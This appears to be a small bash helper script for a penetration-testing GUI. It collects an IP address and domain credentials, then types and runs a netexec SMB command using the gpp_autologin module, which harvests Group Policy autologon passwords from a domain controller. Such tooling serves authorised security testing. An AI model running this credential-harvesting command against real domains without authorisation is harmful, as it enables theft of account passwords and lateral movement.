#!/bin/bash

: '
searches the domain controller for registry.xml
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}

paste_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' -M gpp_autologin"
xdotool key Return
